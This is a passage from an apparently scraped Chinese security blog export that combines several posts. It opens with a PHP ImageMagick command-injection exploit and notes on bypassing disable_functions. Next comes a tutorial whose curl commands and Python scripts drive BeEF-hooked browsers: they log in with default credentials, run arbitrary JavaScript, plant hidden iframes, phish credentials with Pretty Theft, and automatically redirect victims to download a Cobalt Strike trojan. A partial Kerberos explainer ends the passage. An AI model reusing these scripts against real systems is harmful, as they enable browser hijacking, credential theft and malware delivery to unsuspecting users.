&quot;\\n&quot;;$command = PHP_SAPI == &#x27;cli&#x27; ? $argv[1] : $_GET[&#x27;cmd&#x27;];if ($command == &#x27;&#x27;) &#123;    $command = &#x27;id&#x27;;&#125;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;pop graphic-contextEOF;file_put_contents(&quot;KKKK.mvg&quot;, $exploit);$thumb = new Imagick();$thumb-&gt;readImage(&#x27;KKKK.mvg&#x27;);$thumb-&gt;writeImage(&#x27;KKKK.png&#x27;);$thumb-&gt;clear();$thumb-&gt;destroy();unlink(&quot;KKKK.mvg&quot;);unlink(&quot;KKKK.png&quot;);?&gt;\n\n\n\nPHP FPM绕过php-fpm是一个fastcgi协议解析器，负责按照fastcgi的协议将TCP流解析成数据。PHP-FPM默认监听9000端口，我们可以自己构造fastcgi协议与fpm进行通信。参考文章：攻击PHP-FPM 实现Bypass Disable Functions\nPHP FFI 绕过PHP FFI (Foreign Function interface)，是自PHP7.4开始提供的一个PHP拓展。该拓展让开发者可以方便的调用C语言写的各种库，实现了高级语言的相互调用。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可bypass disable_functions。\nWindows COM组件绕过Windows环境下，当php.ini的设置项com.allow_dcom=true时，可以通过COM组件执行系统命令，资料参考：PHP 5.x COM - Safe Mode &#x2F; disable_functions Bypass\nWindows PHP拓展win32std绕过win32std是一个很老的PHP扩展，其中的win_shell_execute函数可以用来执行Windows系统命令，参考PHP 5.2.3 Win32std - ‘win_shell_execute’ Safe Mode &#x2F; disable_functions Bypass。\n相关工具https://github.com/verctor/BShell\nhttps://github.com/teambi0s/dfunc-bypasser\nhttps://github.com/obolu/Bypass_Disable_functions  搭建docker测试环境\n参考\nhttps://www.cnblogs.com/zw1sh/p/12632126.html\nhttps://www.meetsec.cn/index.php/archives/45/\nhttps://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/paper/readme.old.md\nhttps://www.anquanke.com/post/id/208451\nhttps://www.anquanke.com/post/id/197745\n\n","categories":["Web安全","攻防渗透"],"tags":["bypass"]},{"title":"利用BeEF REST API自动化控制僵尸主机","url":"/2017/06/%E5%88%A9%E7%94%A8beef-rest-api%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A7%E5%88%B6%E5%83%B5%E5%B0%B8%E4%B8%BB%E6%9C%BA/","content":"利用BeEF REST API自动化控制僵尸主机\n一. 前言 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它的API，顺便练习一下python编程，这里把自己的学习内容分享下。本文涉及的一些内容可能具有一定的攻击性，请遵守国家法律，禁止用于非法用途。\n二. 通过API控制beef　　BeEF从0.4.3.3,版本开始，提供了静态API接口，用户可以通过发送HTTP &#x2F; JSON请求控制Beef。\n　　我们可以通过程序，批量自动加载执行某些beef的模块，实现比如自动维持权限，Getshell等功能。\n　　在后面的正文里，每一个调用模块的示例中，我都会尝试单独编写代码进行测试，最后，我会将各个部分组合起来，实现一个自动化控制的小demo。本文涉及到的所有代码你都可以在这里找到：https://github.com/ssooking/AutoBeef/。进入正题，我们先启动beef。本机IP：192.168.1.133\n默认hook js：http://192.168.1.133:3000/hook.js默认hook页面： http://192.168.1.133:3000/demos/basic.html默认管理界面：  http://192.168.1.133:3000/ui/panel\n\n\n　　当我们启动beef的时候，会自动生成一个静态API key，这个key用于身份认证，我们每次通过API进行控制时，都要添加这个参数值 。需要提到的是，如果你发现后文的API key，session等参数值发生了变化，是因为这篇文章不是一次写完的，测试时因为重新开启beef产生了变化，因此不要纠结，我们应该关注API如何调用。\n下面，我们可以创建一个简单的hook页面 ，如xss.html\n&lt;html&gt;　　&lt;head&gt;　　　　&lt;script src=&quot;http://192.168.1.133:3000/hook.js&quot;&gt;&lt;/script&gt;　　&lt;/head&gt;&lt;/html&gt;\n\n　　我们也可以访问默认hook页面 http://192.168.1.133:3000/demos/basic.html，为了测试，这里我使用了一台虚拟机，本机也使一个浏览器被hook。在管理面板可以看到主机已经上线。\n \n　　在控制台，我们能够直接看到被hook的主机，并执行相关攻击模块。那么怎样通过API实现这些功能呢？下面，我们将通过实例进行介绍。在此之前，我们需要知道的是，用于处理我们的API请求的文件，主要存放于beef框架下core目录和core&#x2F;api目录下，我们可以在该目录下查找并阅读相关源代码，了解功能的实现机制，使用API进行HTTP交互时，默认的交互数据类型为json。\n获取API Key&#x2F;api&#x2F;admin&#x2F;login是用户登录接口，通过该接口登录之后，我们可以得到用于会话认证的API key\n我们用curl命令，使用默认的口令提交登录请求，会返回我们的key。这个功能可以被用于后文编写自动化控制脚本。\ncurl -H &quot;Content-Type: application/json&quot; -X POST -d &#x27;&#123;&quot;username&quot;:&quot;beef&quot;, &quot;password&quot;:&quot;beef&quot;&#125;&#x27; http://192.168.1.133:3000/api/admin/login\n\n \n我们可以用下面这样一个简单的小脚本实现，代码也比较简单，不再多废话\n#!/usr/bin/env python# -*- coding: utf-8 -*-# ** Author: ssookingimport jsonimport urllib2def getauthkey(host):    apiurl =  host + &quot;api/admin/login&quot;    logindata = &#123;        &quot;username&quot;:&quot;beef&quot;,         &quot;password&quot;:&quot;beef&quot;    &#125;    jdata = json.dumps(logindata)             # 对数据进行JSON格式化编码    req = urllib2.Request(apiurl, jdata)      # 生成页面请求的完整数据    response = urllib2.urlopen(req)           # 发送页面请求    resdata = response.read()                 # 获取服务器返回的页面信息，数据类型为str    jsondata =  json.loads(resdata)           # 把数据解析成python对象，此时返回dict数据          return jsondata[&#x27;token&#x27;]if __name__ == &#x27;__main__&#x27;:    host = &quot;http://192.168.1.133:3000/&quot;    print getauthkey(host)\n\n获取hook主机列表API中，我们要获取hook主机信息的api接口为：api&#x2F;hooks。提交请求的格式类似于这样： api&#x2F;hooks?token&#x3D;xxxxx。需要的参数token的值是用于身份认证的API key。我们用curl命令发送请求，获取hook主机列表信息。\ncurl http://192.168.1.133:3000/api/hooks?token=641640ae3ce89c4da45ee98de341f3e858f62bd3\n\n\n返回了当前hook的主机情况，返回的json数据格式不太友好，作为测试，我们可以使用json代码格式化工具便于查看。\n这里是一个不错的在线json编辑工具：http://tool.lu/json/。我们也可以直接在浏览器中访问url，但是后文涉及提交某些必要的参数时，不能使用这种方式。\njson代码经过格式化之后，我们可以看到，有两个主机上线。每个上线主机都有id号来表示身份。\n\nsession参数值是后面通过A{I调用执行beef模块时必须的参数，这个值你也可以在Web控制台的Cookie处找到。\n\n我们也可以通过脚本发送类似的请求实现这个获取这些信息，比如下面这个简单的示例代码\n#!/usr/bin/env python# -*- coding=utf-8 -*-# ** Author: ssookingimport jsonimport urllib2def getHookedBrowsers(host,authkey):    f = urllib2.urlopen(host + &quot;/api/hooks?token=&quot; + authkey)    data = json.loads(f.read())    hooked = data[&quot;hooked-browsers&quot;][&quot;online&quot;]    print hooked    return hookedif __name__ == &#x27;__main__&#x27;:    host = &quot;http://192.168.1.133:3000/&quot;    key = &quot;e7170da7263c46d8e505ab044017707107a2ee6f&quot;    getHookedBrowsers(host,key)\n\n\n如果你想知道某个被hook主机的详细信息，只要加上浏览器session值即可，它的请求格式应该是这样的\n/api/hooks/浏览器session会话值?token=xxxxxxxxxxxxxxx\n\n再来说说怎样调用模块，这部分功能是由&#x2F;api&#x2F;modules.rb控制的\n列举可调用的模块信息我们通过&#x2F;api&#x2F;modules接口列举出可以调用的模块\ncurl http://192.168.1.133:3000/api/modules?token=641640ae3ce89c4da45ee98de341f3e858f62bd3\n\n\n返回的格式不友好，我们直接在浏览器里访问\n \n我们可以发现，每一个模块都有对应的id号。我们在beef控制台里随便找一个，也可以找到这个id。但是需要注意一下，这个id号会因为你BeEF模块数目的不同有所变化，在编写代码之前你应该确认这个id号。\n\n 　  如果你请求的格式像这样： &#x2F;api&#x2F;modules&#x2F;130?token&#x3D;xxxxx ， 即modules后面加上了具体的模块id号，那么可以得到这个模块的详细信息，比如需要的参数等\n　　所以，如果想要调用某个模块，我们只需要知道这个模块的id，并且在发送请求的的时候提供该模块需要的参数即可。\n　　执行模块时请求的格式是这样的　&#x2F;api&#x2F;modules&#x2F;:session&#x2F;:module_id （session是被hook的浏览器会话，module_id即为beef模块的id号）\n　　需要注意的是，提交参数时，Content-Type必须为json类型,字符集为 UTF-8，并且请求的主体内容必须是有效的json数据，这在后文有实例。\n\n执行BeEF模块　　举个调用例子。\n　　这里使用一个简单的权限维持模块 Confirm Close Tab。这个模块的作用是，受害者在试图关闭选项卡时会向用户显示”关闭确认”对话框，通过这种方式来增加shell的存活时间。相关功能的模块还有 Man-In-The-Browser，Create Foreground iFrame，Create Pop Under。\n\n我们可以看到，这个模块id为177，不需要提供其他参数，那么我们可以用curl模拟这种格式的请求来执行该模块\ncurl -i -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&#125;&#x27; http://xxxxx/api/modules/浏览器session/模块id?token=xxxx\n\n \n虽然模块不需要额外的参数，但是因为请求主体必须为json格式，所以我们用 -d ‘{}’ 发送空数据。此时beef终端会有执行成功的提示。\n如果你没有这个参数，就会报如图中 Invalid JSON input for module ‘177’  的错误\n\n 在浏览器中验证，当我们点击关闭这个页面时，会弹出确认框，说明成功加载了这个模块。\n\n同样的，我们可以编写脚本执行该模块\n#!/usr/bin/env python# -*- coding=utf-8 -*-# ** Author: ssookingimport jsonimport urllib2def sendConfirm(host, sessionId, authkey):    postdata = &#x27;&#123;&#125;&#x27;    url = host + &quot;api/modules/&quot; + sessionId + &quot;/177?token=&quot; + authkey    print &quot;[+] URL: &quot; + url    req = urllib2.Request(url, postdata)    req.add_header(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;)    f = urllib2.urlopen(req)    print f.read()if __name__ == &#x27;__main__&#x27;:    host = &quot;http://192.168.1.133:3000/&quot;    sessionId = &quot;tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU&quot;    key = &quot;e7170da7263c46d8e505ab044017707107a2ee6f&quot;    sendConfirm(host,sessionId,key)\n\n\n 来一个带参数的例子，这次我使用的是Raw JavaScript模块，这个模块允许我们在目标浏览器上执行javascript代码。注意，这些javascript代码不能经过特殊编码。\n \n这个模块的id号为169，我们再来看看它需要的参数，通过下面这样的请求获取模块详细信息\n\n\n需要提供的参数名为：”cmd”，参数内容是我们要执行的Javascript代码，我们可以用curl构造请求进行测试\ncurl -i -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&quot;cmd&quot;:&quot;alert(\\ssooking\\);&quot;&#125;&#x27; http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/169?token=dadd1be063d3a3b4339d84f5bdbbcbb25616b41d36a3b062697706d9f2d5\n\n\n因为不能用多个单引号，所以我用alert(&#x2F;ssooking&#x2F;)代替，但是没有弹出窗口，不过我使用自己编写的脚本执行这个模块就可以成功执行\n#!/usr/bin/env python# -*- coding=utf-8 -*-# ** Author: ssookingimport jsonimport urllib2def execJavascript(host, sessionId, authkey):    payload=&#123;        &quot;cmd&quot;:&quot;alert(&#x27;Hello ssooking!&#x27;);&quot;    &#125;    apiurl = host + &quot;api/modules/&quot; + sessionId + &quot;/169?token=&quot; + authkey    print &quot;[+] URL: &quot; + apiurl    jdata = json.dumps(payload)     req = urllib2.Request(apiurl, jdata)     req.add_header(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;)    response = urllib2.urlopen(req)      resdata = response.read()                     return resdataif __name__ == &#x27;__main__&#x27;:    host = &quot;http://192.168.1.133:3000/&quot;    sessionId = &quot;ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso&quot;    key = &quot;dadd1be063d3a3b4339d84f5bdbbcbb25616b41d&quot;    print execJavascript(host,sessionId,key)\n\n \n弹出了窗口\n\n再举个带参数的例子，这次我使用的是Create Invisible Iframe模块，它的功能是创建一个隐藏的Frame。\n这个模块的id为174，需要的参数是隐藏的Frame所指向的url地址\n\n先查看一下模块的详细参数\n\n\n可以看到，这个请求的这个url参数名为”target”。下面进行测试，我们使用python创建一个简单的HTTP服务器\n\n我们用curl构造请求\ncurl -i -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&quot;target&quot;:&quot;http://192.168.1.133:8000/&quot;&#125;&#x27; http://192.168.1.133:3000/api/modules/tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU/174?token=32c75b5e91ef4e519da119349d2c0cbd7cd23259\n\n执行成功，python HTTP上成功回显，说明我们在目标的浏览器上创建了一个隐藏的iframe，并使其访问了这个url地址\n\n \n获取模块执行结果有些模块执行完毕后，我们需要获取返回的数据，比如凭证欺骗模块Pretty Theft，我们想要获取用户输入的认证口令。\n我们使用一个简单的windows凭证认证模板\n\n这时候目标浏览器上会弹出认证框\n\n模拟提交了凭证之后，从beef的执行结果中，我们可以看到欺骗到的密码\n\n下面就通过API调用执行该模块，先看下参数\n\n查看模块详细信息，我们可以知道，需要设置的参数有：欺骗对话框类型”choice”，背景风格”backing”，Logo的图片地址”imgsauce” ，因此请求示例应该像这样：\ncurl -i -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&quot;choice&quot;:&quot;Windows&quot;,&quot;backing&quot;:&quot;Grey&quot;,&quot;imgsauce&quot;:&quot;http://0.0.0.0:3000/ui/media/images/beef.png&quot;&#125;&#x27; http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/117?token=dadd1be063d3a3b4339d84f5bdbbcbb25616b41d\n\n\n\n　　\n执行成功，并且返回了模块执行的id为35。假设我们提交的口令是：test333&#x2F;123456\n\n我们想要获取受害者提供的这些认证信息，这时候，我们需要这样请求：\n/api/modules/浏览器session/模块id/command_id？token=xxx\n\n 比如\n\n  \nBeef与metasploit联用　　我们当然不能忘记了metasploit这个神器。Beef与metasploit联用，实在是个大杀器。要想在beef加载metasploit，我们首先需要修改默认的配置文件，修改beef下config.yaml文件\n\n把启用metasploit这个选项值改成true\n\n另外,如果你的metasploit安装位置不包含在默认路径里，需要在beef-xss/extensions/metasploit/config.yaml的文件里设置一下\n\n然后我们启动msf加载msgrpc\nmsfconsole -x &quot;load msgrpc ServerHost=127.0.0.1 Pass=abc123&quot;\n\n\n\n\n重启beef即可加载metasploit模块\n\n\n　　同样的，如果你想调用Metasploit模块，步骤与前面的都一样，先查看改模块的id所需参数等信息，然后构造请求调用这个模块即可，关于metasploit模块调用，因为过两天就要考试了，没有时间做测试，有兴趣的朋友可以试一试。这个是 BeEF-RESTful-API的上一个请求示例。\ncurl -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &#x27;&#123;&quot;SRVPORT&quot;:&quot;3992&quot;, &quot;URIPATH&quot;:&quot;77345345345dg&quot;, &quot;PAYLOAD&quot;:&quot;generic/shell_bind_tcp&quot;&#125;&#x27; -X POST http://xxxx/api/modules/浏览器session?token=xxx\n\n三. 编写自动化控制脚本　　下面我尝试编写一个简单的自动控制hook主机的脚本，批量执行我提前设定的一些模块。我的思路是定时获取hook主机的session信息 ，存放到一个字典里，如果有新上线的僵尸主机的浏览器session，我们就通过API控制这个浏览器执行我们设定好的Beef模块，并把这个session添加到一个列表里，表示已经执行过。如果检测到某个session已经存在于列表中，说明已经执行过，就不再执行。测试的代码中，我用到了三个模块：Confirm Close Tab，Raw Javascript，Redirect Browser。第一个模块用于增加shell存活时间，第二个模块用于执行javascript代码，第三个模块使浏览器进行跳转下载，我把这个跳转地址指向一个Cobalt Strike生成的测试木马，并模拟受害者自动下载并运行恶意软件。\n#!/usr/bin/env python# -*- coding: utf-8 -*-# ** Author: ssooking# ** Name： AutoBeef.pyimport jsonimport urllib2import timehostlist = []hostdict = &#123;&#125;def getauthkey(host):    apiurl =  host + &quot;api/admin/login&quot;    logindata = &#123;        &quot;username&quot;:&quot;beef&quot;,        &quot;password&quot;:&quot;beef&quot;    &#125;    jdata = json.dumps(logindata)             # 对数据进行JSON格式化编码    req = urllib2.Request(apiurl, jdata)      # 生成页面请求的完整数据    response = urllib2.urlopen(req)           # 发送页面请求    resdata = response.read()                 # 获取服务器返回的页面信息，数据类型为str    jsondata =  json.loads(resdata)           # 把数据解析成python对象，此时返回dict数据    return jsondata[&#x27;token&#x27;]def getHookedBrowsersSession(host,authkey):    f = urllib2.urlopen(host + &quot;/api/hooks?token=&quot; + authkey)    data = json.loads(f.read())    hookonline = data[&#x27;hooked-browsers&#x27;][&#x27;online&#x27;]    for x in hookonline:        hookid = hookonline[x][&#x27;id&#x27;]        hookip = hookonline[x][&#x27;ip&#x27;]        hooksession = hookonline[x][&#x27;session&#x27;]        if hookid not in hostdict:            hostdict[hookid] = hooksession            print &quot;\\n[+] Hooked host id:  &quot; + bytes(hookid) + &quot;\\n   &gt;&gt;&gt; IP: &quot; + bytes(hookip) + &quot;\\n   &gt;&gt;&gt; Session: &quot; + hooksessiondef sendConfirm(host, session, authkey):    postdata = &#x27;&#123;&#125;&#x27;    url = host + &quot;api/modules/&quot; + session + &quot;/177?token=&quot; + authkey    #print url    req = urllib2.Request(url, postdata)    req.add_header(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;)    f = urllib2.urlopen(req)    print &quot;   &gt;&gt;&gt; [+] Module Confirm Close Tab has been Executed ! &quot;    return f.read()def execJavascript(host, session, authkey):    payload=&#123;        &quot;cmd&quot;:&quot;alert(&#x27;Hello by ssooking!&#x27;);&quot;    &#125;    apiurl = host + &quot;api/modules/&quot; + session + &quot;/169?token=&quot; + authkey    jdata = json.dumps(payload)    req = urllib2.Request(apiurl, jdata)    req.add_header(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;)    response = urllib2.urlopen(req)    resdata = response.read()    print &quot;   &gt;&gt;&gt; [+] Module Raw JavaScript has been Executed ! &quot;    return resdatadef redirectBrowser(host, session, authkey):    payload = &#123;&quot;redirect_url&quot;:&quot;http://192.168.1.133:8000/plugins.exe&quot;&#125;    apiurl = host + &quot;api/modules/&quot; + session + &quot;/42?token=&quot; + authkey    jdata = json.dumps(payload)    req = urllib2.Request(apiurl, jdata)    req.add_header(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;)    response = urllib2.urlopen(req)    resdata = response.read()    jsondata =  json.loads(resdata)    print &quot;   &gt;&gt;&gt; [+] Module Redirect Browser has been Executed ! &quot;    return jsondatadef createIFrame(host, sessionId, authkey):    postdata = &#x27;&#123;&quot;target&quot;:&quot;http://192.168.1.133:8000/&quot;&#125;&#x27;    url = host + &quot;api/modules/&quot; + sessionId + &quot;/174?token=&quot; + authkey    req = urllib2.Request(url, postdata)    req.add_header(&quot;Content-Type&quot;, &quot;application/json; charset=UTF-8&quot;)    f = urllib2.urlopen(req)    print &quot;   &gt;&gt;&gt; [+] Module Create Invisible Iframe has been Executed ! &quot;    return f.read()def autoRunModules(host,session,authkey):    #sendConfirm(host, session, authkey)    #execJavascript(host, session, authkey)    redirectBrowser(host, session, authkey)def timeRun(interval,host):    authkey = getauthkey(host)    print &quot;[+] AutoBeef is running....&quot;    print &quot;[+] BeEF KEY is : &quot;+ authkey    print &quot;[+] Base BeEF API URL: &quot;+ host + &quot;api/&quot;    print &quot;[+] Hook URL   : &quot; + host + &quot;hook.js&quot;    print &quot;[+] Hook Demo  : &quot; + host + &quot;demos/basic.html&quot;    while True:        try:            getHookedBrowsersSession(host, authkey)            for x in hostdict:                if hostdict[x] not in hostlist:                    hostlist.append(hostdict[x])                    autoRunModules(host,hostdict[x],authkey)            time.sleep(interval)        except Exception, e:            print eif __name__ == &#x27;__main__&#x27;:    beefhost = &quot;http://192.168.1.133:3000/&quot;    timeRun(3,beefhost) \n\n代码比较挫，没有什么要说的，容易遇到问题的地方是处理返回的数据类型，需要注意str，dict，list等数据类型的处理与转换。我先只执行一个Redirect Browser模块  \n程序检测到有新的上线控制僵尸，会控制浏览器自动下载我们的恶意程序\n\n\n一旦受害者点击这个程序\n\n\n当受害者运行恶意软件时，我们可以获得控制权\n\n 当然我们也可以执行多个模块，你只需要在autoRunModules函数中添加你想执行的模块即可，比如我再测试执行Confirm Close Tab，Raw Javascript两个模块\n\n 但是需要注意的是，有些模块功能上是冲突的，不能一起执行，比如刚才的例子Confirm Close Tab和Redirect Browser。\n\n\n\n 我们可以执行多个模块，运行截图\n \n到这里也就基本差不多了，只要思路够开阔，就有很多好玩的姿势，下面一些好玩的模块：\n\nCreate Invisible Frame    + Browser Autopwn ：我们可以用metasploit的 Browser Autopwn模块生成一个攻击浏览器的url，然后创建一个隐藏的iframe指向这个url\nRaw Javascript ： 光是这个就能干很多事，不只是弹框哦～～\nFake Notification Bar ，Fake Flash Update： 伪装浏览器插件，flash升级等，配合执行恶意软件\nPretty Theft： 欺骗认证凭据的，可以试着自己做个模板，哪里能用到？。。报名统计啦，手机投票啦～～\n\n配合一些漏洞\n\nms10-046　Microsoft Windows Shell LNK Code Execution\nCVE-2015-0096 Microsoft Windows Shell SMB LNK Code Execution Exploit\n\n不知道能不能配合永恒之蓝的msf模块～～～～\n对于手机，也有很多模块可以使用\n\n关于代码 \n如果你要使用AutoBeef，你需要对代码进行一些修改使其适应你的beef平台，比如beef主机地址，某个模块的id等等。你可以根据自己的需要添加相关模块，你也可以对其进行优化，使其更加健壮。其实官方也提供了beefapi的库，你可以在这里找到https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py。通过调用里面的函数，我们也可以很方面地对beef进行控制，但是涉及到执行某个模块时，我们还是需要查看模块详细信息，提供其必要的参数。所以，我建议自己可以动手实现一下，只有这样我们才能进步提高，而且自己写的代码，可以根据自己的需要随时进行拓展修改，遇到问题也能很快解决。\n如果你要使用官方提供的beefAPI，你需要把它移植到你的python库中,kali里默认路径是这样：\nsudo cp beefapi.py /usr/lib/python2.7/dist-packages/\n\n 使用的时候从beefapi中导入即可，你可以查看帮助或者阅读其源代码\n\n\n遇到的问题\n　　测试过程中我使用的是chrome和firefox，并且发现IE,360等浏览器无法正常hook。\n四. 最后的话　　只是一句话，不要随便点开一个链接。\n参考文章\nhttps://github.com/beefproject/beef/wiki/BeEF-RESTful-API\nhttps://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py\n","categories":["神兵利器"],"tags":["BeEF","XSS"]},{"title":"域渗透之Kerberos","url":"/2019/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos/","content":"什么是域？​    域是一个有安全边界的计算机集合。对于不同的域来说，相当于不同的组织、集体。每个域都有自己的安全策略，以及它与其他域的安全信任关系。对于同一个域内部的不同计算机来说，它们通过共同的第三方信任机构建立信任关系，这个第三方信任机构角色由 DC (Domain Controller，域控制器) 担当，所有的认证及信任关系的建立由DC来完成，域内计算机直接不再进行独立的点对点安全认证。通俗来说就是，域中的机器信任域控制器，那么只要我们获得了域控制器信任，就可以在域内获得对其他服务器的访问权限。每个域的管理员只能管理自己所属域的内部，除非其他的域赋予了管理权限，这样才能够访问或者管理其他域。域管理员可以通过持有域的登陆和访问票据，从而有权限登陆域内任何一台机器，实现对域内其他计算机的远程管理、资源访问，因此域管理员权限是十分大的，而在域环境中实现这种认证机制的就是Kerberos 。\n一个模拟的认证场景​    为了帮助我们理解kerberos认证，我们先模拟一个认证场景，假设有一家实行会员制的高级餐厅，只有持餐厅会员证的顾客能够在餐厅购买指定包厢的用餐券，进而凭用餐券在对应包厢进行用餐，普通顾客无权消费和用餐。假设有一位会员顾客想要用餐，他需要经过以下流程：\n\n首先，顾客到前台会员认证处提供自己的姓名、手机、身份证等信息，要求领取会员证。\n前台客服在电脑上的会员信息库中搜索相关信息，判断是否存在该会员用户。如果有，则给用户提供会员证。\n顾客拿到会员证后去前台购券处，凭借会员证，拿到一张用户指定包厢的用餐券。\n顾客拿到用餐券后，来到这个指定的包厢，凭借用餐券用餐。如果顾客拿着该用餐券去其他包厢，则无法用餐。\n\n​    在这个场景中，我们很明显能够看出来，如果我们想要用餐，必须要有两样东西：会员证、用餐券。会员证可以证明我们有权购买用餐券；而凭借用餐券，我们才能用餐。所以想要用餐，必须先拿到会员证，再凭借会员证拿到用餐券，进而凭券用餐。理解了这个场景中的认证机制，我们便进入正题。\n认识Kerberos认证体系Kerberos协议​    Kerberos 是除NTML的另外一种网络认证协议，支持Windows和Linux。它提供了一种单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。\n​    因为考虑到这样的场景，在一个网络中会有许多不同的网络对象，比如web服务器、打印机、邮件服务器、文件服务器等等，这些不同的网络对象都有认证需求，很明显，由于架构不同，我们不可能让每个对象都自己实现一套认证系统，因此Kerberos基于一个中心认证服务器，由该服务器统一进行身份认证。中心认证服务器维护了一个帐号数据库(AD，Account Database)，类似于存储本地用户名、密码hash的数据库SAM，AD数据库中存储了合法域用户的用户名及密码Hash信息，所有客户端只需与该认证服务器认证，即可判断身份合法性。\n​    在通过身份认证机制后，Kerberos提供一种基于票据（Ticket）的可信任的第三方访问认证服务，通过传统的密码技术（如共享密钥）执行访问认证。假如客户端要访问服务器的资源，需要获取服务器认可的Ticket。打个比喻就是凭票入场，类似于上文提到的用餐场景，但是获取票据之前，还需要先拿到一张购票证，有这个购票证的才能买票，这张“购票证”叫做票据授予凭证 (TGT，Ticket Granting Ticket)。\n​    颁发TGT（Ticket Granting Ticket）的工作由AS服务（Authentication Sevice）完成，而颁发Ticket的工作由TGS服务（Ticket Granting Service）完成，类似上文提到的用餐场景中的前台会员认证处与前台购券处。AS 和 TGS 服务共同构成了具有完整身份认证及访问认证功能的服务中心，该服务中心有一个专门的名字，叫做“密钥分发中心”(KDC，Key Distribution Center)。在Windows域环境中，AD帐号数据库和KDC的角色在物理上均由域控制器DC（Domain Controller）来担任，因此这也是为什么我在开篇说域中的认证及信任关系的建立均由DC来完成，由此可见域控制器的重要性。\nKerberos认证体系中的重要角色Kerberos\n\nClient\nServer\nKDC (Key Distribution Center)\n\n DC (Domain Controller)\n\nAD (Account Database)：帐号数据库\n\nKDC (Key Distribution Center)：密钥分发中心\n\nAS (Authentication Service)：为客户端生成TGT\nTGS (Ticket Granting Service)：为客户端生成某个服务器的Ticket\n\n\n\n用一张图来表示它们的逻辑关系：\n\n\n注意：在有些文章里提到的KAS(Kerberos Authentication Service) 的概念实际上就是AS (Authentication Service)。\n\n基础概念在正式了解kerberos认证机制之前，你必须熟读以下概念，并且如果你在后文忘记了这些概念，可以快速回顾。\n\nAD (Account Database)：帐号数据库，与SAM (Security Account Manager Database，安全账号管理数据库)类似，位于ntds.dit文件中，存储了用户的用户名及密码Hash，只有存在于该数据库中的用户才被认为是合法和可信任的，才能申请到TGT。\n\nTicket：票据，全称为ST(Service Ticket)，服务票据，是网络对象授权访问的凭证，持有某个服务器服务票据的客户端才有权访问该服务器上的资源。\n\nTGT (Ticket Granting Ticket)：直译为票据授予票据，我将其译为票据授予凭证，这是是一种临时凭证，只有拥有此凭证，才能够获取到票据。网上很多人意译为入场券，也是差不多的意思，喻义凭入场券购票，凭票入场。\n\nKDC (Key Distribution Center)：密钥分发中心，负责管理、认证、分发票据。KDC由AS、TGS服务共同组成。AS服务可以生成TGT，而TGS服务则可以生成Ticket 。\n\nAS (Authentication Service)：在身份认证阶段中，为客户端生成TGT，凭借TGT后续才能申请Ticket 。\n\nTGS (Ticket Granting Service)：在访问认证阶段中，为客户端生成可访问服务器资源的Ticket。\n\nActive Directory Domain Services：    Active Directory域服务是Windows提供的一种对网络资产、服务、网络对象（如用户，计算机，打印机等）进行组织化管理的服务。它可以集中控制加入域的所有计算机的权限，具有统一化管理、更高效的权限分配、更高的安全性、较低的管理成本等特性，因此一般许多企业和组织会通过Active Directory域服务来进行统一化管理。Active Directory域服务以域名来划分域的边界，定义网络管理范围。通常一个域对应一个域名，域之间可以相互信任。在Windows Server上，如果想要构建域环境，必须安装这个服务。安装过程中，你需要设置一个域名来表示你的内部域环境。安装完毕后，运行dcpromo命令则会检查Active Directory域服务的安装情况。安装了Active Directory域服务的服务器，会被视为DC（Domain Controller）域控制器。如果想要加入一个域，你只需在客户端计算机名中设置该域的域名即可。如果你想构建一个基础的域环境，可以参考域渗透之构建基础域环境。\n\n\nKerberos域认证流程kerberos认证从整体流程上分为三个阶段：\n\n请求TGT票据\n请求Ticket票据\n通过Ticket访问服务器\n\n下面介绍一下详细流程：\n第一阶段：向AS请求TGT票据(AS_REQ &amp; AS_REP)\n\n用户访问客户端计算机并输入域帐号和密码，尝试访问服务器资源\n客户端对密码进行hash处理并缓存，然后将用户名、加密的Authenticator认证信息发送给KDC进行AS_REQ 认证请求，请求获得TGT。这里发送的两个数据为：\n用于登录的用户名\nAuthenticator认证信息：包含客户端信息(Domain\\hostname)以及时间戳，使用用户的NTML-Hash加密\n\n\nKDC收到请求后，在AD (Account Database，帐户数据库) 查找该用户名，如果存在该用户，提取该用户密码的Hash作为密钥解密Authenticator信息，如果解密成功，则证明请求者提供的密码正确，即成功认证了对方身份。这时，KDC便生成一个随机字符串作为临时密钥，叫Login Session Key (登录会话密钥)，然后用该用户的NTML-Hash加密这个Login Session 